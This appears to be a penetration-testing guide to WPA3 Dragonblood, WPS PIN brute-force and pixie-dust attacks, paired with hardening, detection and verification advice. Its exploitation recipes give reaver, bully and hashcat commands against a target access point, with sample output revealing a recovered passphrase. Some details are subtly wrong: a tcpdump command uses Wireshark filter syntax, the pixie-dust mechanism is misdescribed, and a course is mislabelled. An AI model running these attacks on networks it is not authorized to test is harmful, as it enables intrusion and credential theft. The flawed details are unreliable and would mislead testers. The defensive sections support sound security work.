# WPA3 and WPS Attacks

Attacks against WPA3-SAE (Dragonblood), WPS PIN brute force, and
pixie dust. WPA3 fixes the offline dictionary attack that broke
WPA2, but has its own weaknesses in transition mode and in the SAE
handshake. WPS was designed for convenience and remains a weak point
on many APs.

> [!CAUTION]
> WPS PIN brute force and Dragonblood attacks can lock the AP or
> disconnect clients. Only run these against networks you own or
> have written authorization to test.

---

## 1. Overview

### WPA3-SAE

WPA3-Personal replaces the WPA2 PSK + 4-way handshake with **SAE**
(Simultaneous Authentication of Equals), a password-authenticated
key exchange based on the Dragonfly handshake (RFC 7664). SAE resists
offline dictionary attacks: an attacker who captures the handshake
cannot crack it offline.

WPA3 also mandates **PMF** (Protected Management Frames), which
prevents deauth attacks.

### WPA3 transition mode

To support legacy devices, WPA3 APs often run in **transition mode**:
the same SSID is advertised as both WPA2 and WPA3. This allows a
downgrade attack - force the client to use WPA2 (which has the
offline crack weakness).

### WPS

Wi-Fi Protected Setup is a convenience feature: enter an 8-digit PIN
to join the network, or press a button. The PIN is verified in two
halves (4 + 4 digits), each checked independently - reducing the
keyspace from 10^8 to ~10^4 + 10^4. This makes WPS PIN brute-forceable
in hours.

Two WPS modes:

- **PIN method:** 8-digit PIN, brute-forceable.
- **PBC (Push Button):** physical button, not brute-forceable
  remotely, but vulnerable to nearby attackers.

### Pixie dust

A WPS attack that exploits weak randomness in the EAP-NACK exchange.
Instead of brute-forcing the PIN, the attacker derives the PSK from
a single M1-M2 exchange. Works on APs with weak RNG (many Broadcom,
Ralink, Realtek chipsets).

---

## 2. Reconnaissance / Enumeration

### 2.1 Identify WPA3 and transition mode

From `airodump-ng` (file 02):

```text
BSSID              PWR  CH  ENC   CIPHER  AUTH  ESSID
12:34:56:78:9A:BC  -45   6  WPA3  CCMP    SAE   CorpWiFi
12:34:56:78:9A:BD  -67   1  WPA2  CCMP    PSK   LegacyAP
AA:BB:CC:DD:EE:FF  -80  11  WPA2  CCMP    PSK   CorpWiFi (same SSID!)
```

Same ESSID on two different BSSIDs, one WPA2 and one WPA3 =
transition mode.

Check the RSN information element with Wireshark:

```text
RSN Information Element
    Group Cipher Suite: CCMP
    Pairwise Cipher Suite: CCMP
    Authentication Key Management Suite:
        PSK (WPA2)
        SAE (WPA3)  <- both, transition mode
```

### 2.2 Identify WPS-enabled APs

```bash
sudo wash -i wlan0
```

Expected output:

```text
BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
12:34:56:78:9A:BC   6  -45  2.0  No   Broadcom  CorpWiFi
AA:BB:CC:DD:EE:FF  11  -80  1.0  Yes  Realtek   LegacyAP
```

`WPS` = version (1.0 or 2.0). `Lck` = locked (after failed attempts).

### 2.3 Identify WPS chipset (for pixie dust)

The pixie dust attack depends on the chipset's RNG. Known-vulnerable
chipsets:

- Ralink RT系列 (many)
- Realtek RTL819x
- Broadcom (some models)
- MediaTek (some models)

The vendor OUI in `wash` output gives a hint. For a definitive answer,
use `reaver` with `-K 1` (pixie dust mode) and see if it succeeds.

### 2.4 SAE handshake capture

SAE uses a different handshake than WPA2. To capture:

```bash
sudo tcpdump -i wlan0 -nn -w sae.pcap 'wlan.fc.type_subtype == 0x0b'
# 0x0b = authentication frame (SAE uses auth frames)
```

The SAE commit and confirm messages are in authentication frames,
not EAPOL.

---

## 3. Common Attack Vectors

### 3.1 Dragonblood (CVE-2019-9494, CVE-2019-9496)

A set of vulnerabilities in the WPA3 SAE handshake:

- **Timing side channel:** leaks information about the password
  through timing differences.
- **Cache-based side channel:** leaks information through cache
  access patterns.
- **Downgrade to WPA2:** in transition mode, force the client to
  use WPA2.
- **DoS:** send a flood of SAE commit messages to exhaust the AP's
  resources.

**Impact:** the timing and cache side channels allow a password
partitioning attack. In practice, the password space is large enough
that the attack is slow (days to weeks). Downgrade is more practical.

**Patched** in most modern implementations (hostapd 2.9+, iOS 13+,
Android 10+). Still relevant for unpatched devices.

### 3.2 WPS PIN brute force

Brute-force the 8-digit PIN. The AP verifies the first 4 digits and
the last 4 digits separately, so the effective keyspace is 10^4 + 10^4
= 20,000 attempts instead of 10^8.

**Tools:** `reaver`, `bully`.

**Duration:** a few hours to a few days, depending on the AP's
lockout policy.

**Impact:** full PSK recovery. Once the PIN is known, the AP reveals
the PSK.

### 3.3 Pixie dust (WPS)

Instead of brute-forcing the PIN, derive the PSK from a single
M1-M2 exchange. Works on APs with weak RNG in the WPS implementation.

**Duration:** seconds to minutes. Much faster than PIN brute force.

**Tools:** `reaver -K 1`, `bully`.

**Impact:** immediate PSK recovery on vulnerable APs.

### 3.4 WPS PBC attack (nearby)

If WPS PBC is enabled, a nearby attacker can press the virtual button
and get the PSK. Requires physical proximity (button press range).

**Tools:** `wpspin`, some custom scripts.

**Impact:** PSK recovery without brute force. Only effective during
the PBC window.

### 3.5 WPA3 transition mode downgrade

If the AP supports both WPA2 and WPA3, capture the WPA2 handshake
and crack it offline (see file 03). The attacker forces the client
to use WPA2 by broadcasting a WPA2-only beacon with the same SSID.

**Impact:** full PSK recovery if the passphrase is weak. Bypasses
the WPA3 protection entirely.

### 3.6 SAE DoS

Send many SAE commit messages to the AP. The AP performs expensive
elliptic curve operations for each, exhausting CPU.

**Impact:** denial of service for legitimate clients.

**Patched** in modern implementations (rate limiting).

---

## 4. Exploitation Recipes

### 4.1 WPS PIN brute force with reaver

```bash
# Step 1: scan for WPS-enabled APs
sudo wash -i wlan0

# Step 2: run reaver against the target
sudo reaver -i wlan0 -b 12:34:56:78:9A:BC -vv -K 1
```

`-K 1` = pixie dust mode (try first). If pixie dust fails, remove
`-K 1` for PIN brute force.

Expected output (pixie dust success):

```text
[+] Pin cracked in 5 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'Summer2026!'
[+] AP SSID: 'CorpWiFi'
```

Expected output (PIN brute force):

```text
[+] Trying pin '1234'
[+] Trying pin '1235'
...
[+] WPS PIN: '12345670'
[+] WPA PSK: 'Summer2026!'
```

### 4.2 WPS PIN brute force with bully

```bash
sudo bully -b 12:34:56:78:9A:BC -c 6 -d wlan0
```

Bully is sometimes faster than reaver for specific chipsets.

### 4.3 Pixie dust with reaver -K 1

```bash
# Pixie dust mode is the default in modern reaver when -K is used
sudo reaver -i wlan0 -b 12:34:56:78:9A:BC -K 1 -vv
```

If the AP has weak RNG, the PSK is recovered in seconds.

### 4.4 Dragonblood downgrade (transition mode)

```bash
# Step 1: capture the WPA2 handshake from a transition-mode AP
# (see file 03 for the handshake capture procedure)

# Step 2: crack it offline
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt
```

If the passphrase is weak, it cracks. WPA3 does not protect against
this attack when transition mode is enabled.

### 4.5 Dragonblood timing side channel (lab)

```bash
# Requires a custom script to measure SAE handshake timing
# Reference: https://github.com/vanhoefm/dragonslayer
# This is a research tool, not a practical attack in most cases
```

The timing attack requires thousands of handshakes and hours of
measurement. Not practical for most engagements.

### 4.6 SAE DoS (lab)

```bash
# Send many SAE commit messages
# Use a tool like dragonslayer or a custom scapy script
# This is DoS - only for lab testing
```

Not recommended for production. Rate limiting in modern APs
mitigates this.

---

## 5. Post-Exploitation

After recovering the PSK (via WPS or downgrade):

- **Join the network** as a normal client.
- **Full Layer 2 access** - ARP spoofing, DNS/DHCP, pivoting
  (file 05).
- **Lateral movement** to internal resources.
- **Check for PSK reuse** on other networks.

After a Dragonblood downgrade:

- Same as above, plus the knowledge that WPA3 alone does not protect
  if transition mode is enabled.

After WPS PIN recovery:

- The PSK is now known. WPS can be disabled but the PSK remains valid
  until changed.

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High (WPS) to Medium (Dragonblood) |
| Preconditions | WPS enabled (for WPS attacks); transition mode (for downgrade) |
| Detectability | High - WPS brute force is loud, WIPS alerts |
| Business impact | Network access, credential theft, lateral movement |

WPS is the single biggest weakness in home and small-office Wi-Fi.
It should be disabled everywhere. WPA3 in transition mode provides
no protection against the WPA2 offline crack.

---

## 7. Root Causes (AppSec)

- WPS PIN is verified in two halves -> keyspace reduced to ~20,000.
- WPS is enabled by default on many consumer APs.
- Some chipsets use weak RNG for the WPS EAP-NACK exchange.
- WPA3 transition mode allows downgrade to WPA2.
- SAE implementation bugs (timing, cache) in early versions.
- Users do not disable WPS after installation.

---

## 8. Preventive Controls (AppSec)

### 8.1 Disable WPS entirely

```text
# hostapd.conf
wps_state=0
```

Or in the AP's web UI. This is the single most effective control.

### 8.2 Use WPA3-SAE with PMF required

```text
# hostapd.conf
wpa=2
wpa_key_mgmt=SAE
ieee80211w=2
sae_password=<STRONG_PASSPHRASE>
```

Disable transition mode (`wpa_key_mgmt=SAE` only, no `WPA-PSK`).

### 8.3 Update AP firmware

Dragonblood patches are in hostapd 2.9+ (2019) and vendor firmware
releases after mid-2019. Check the AP vendor for updates.

### 8.4 Disable WPS PBC if PIN is disabled

```text
# hostapd.conf
wps_state=0
config_methods=
```

PBC is less risky than PIN but still exploitable by nearby attackers.

### 8.5 Strong passphrase (defense in depth)

Even if WPS or downgrade leaks the PSK, a strong passphrase makes
offline cracking infeasible.

```text
# Minimum: 20+ random characters, or 5+ word Diceware passphrase
```

### 8.6 Monitor for WPS brute force

A WIPS detects repeated WPS PIN attempts. Alert on > 10 attempts
per minute from the same client.

### 8.7 Rate limiting on SAE

```text
# hostapd.conf - anti-clogging threshold
sae_anti_clogging_threshold=5
```

Limits SAE commit processing to mitigate DoS.

---

## 9. Detection Controls (AppSec)

### 9.1 WPS brute force detection

- Multiple WPS PIN attempts from the same client MAC.
- Failed WPS M1-M8 exchanges.
- Repeated EAP-NACK responses.

WIPS rule (conceptual):

```text
if count(wps_pin_attempts per src_mac, 60 sec) > 10:
    alert("WPS brute force")
```

### 9.2 Dragonblood detection

- SAE commit flood from a single MAC (DoS attempt).
- Unusual timing patterns in SAE handshakes (side channel).
- Downgrade attempts (client switching from SAE to PSK).

### 9.3 WPS PBC detection

- PBC button press events outside normal hours.
- New client associations immediately after a PBC press.

### 9.4 SIEM rules

- Alert on > 10 WPS attempts per minute.
- Alert on SAE commit flood (> 100 per second).
- Alert on new client associations with a different security type
  than the AP advertises.

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **WPS disabled:** run `wash -i wlan0`. The AP should not appear
   in the WPS list.
2. **WPA3 only (no transition):** check beacon RSN information
   elements. Only SAE should appear, not PSK.
3. **Firmware patched:** run a Dragonblood timing test against the
   AP. Modern implementations should not leak timing information.
4. **SAE anti-clogging:** send 100 SAE commit messages rapidly. The
   AP should rate-limit or drop excess messages.
5. **Strong passphrase:** if WPS is accidentally enabled, capture
   the PSK and try to crack it. Should fail with a strong passphrase.

---

## 11. OSCP Notes

WPS and WPA3 attacks are **not** in the OSCP exam. They are relevant
for:

- Real internal engagements with physical proximity.
- PEN-210 (OSCP+) covers wireless.
- Red team operations with RF access.

For the report, document:

- The WPS version and chipset (from `wash` and `reaver` output).
- Whether pixie dust or PIN brute force was used.
- The recovered PSK and how it was used.
- The defensive control (WPS disabled, WPA3 only, patched firmware).

---

## 12. Production Notes

- **WPS PIN brute force is loud.** Every attempt is logged by the
  AP. A WIPS alerts within minutes. Assume detection.
- **Pixie dust is fast but chipset-dependent.** Try it first; if the
  AP is not vulnerable, fall back to PIN brute force.
- **Dragonblood timing attack is not practical** in most engagements.
  Use downgrade instead.
- **WPA3 transition mode is the biggest WPA3 weakness.** If the
  network has any WPA2 clients, transition mode is likely enabled.
  Downgrade and crack the WPA2 handshake.
- **Always disable WPS.** There is no reason to keep it enabled in
  2026. If a device requires WPS, upgrade or replace it.

---

## 13. References

- [Dragonblood paper](https://wpa3.mathyvanhoef.com/) - Vanhoef &
  Ronen, 2019
- [dragonslayer](https://github.com/vanhoefm/dragonslayer) - research
  tool for Dragonblood
- [reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x) -
  reaver with pixie dust
- [bully](https://github.com/aanarchyy/bully) - WPS brute force
- [hashcat](https://hashcat.net/hashcat/) - mode 22000
- [WPA3 Specification (Wi-Fi Alliance)](https://www.wi-fi.org/discover-wi-fi/security)
- RFC 7664 - Dragonfly Key Exchange
- [MITRE ATT&CK T1557 - Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)
- IEEE 802.11-2020 - Wireless LAN Medium Access Control
- NIST SP 800-153 - Guidelines for Securing Wireless Local Area Networks
- `man reaver`, `man wash`, `man bully`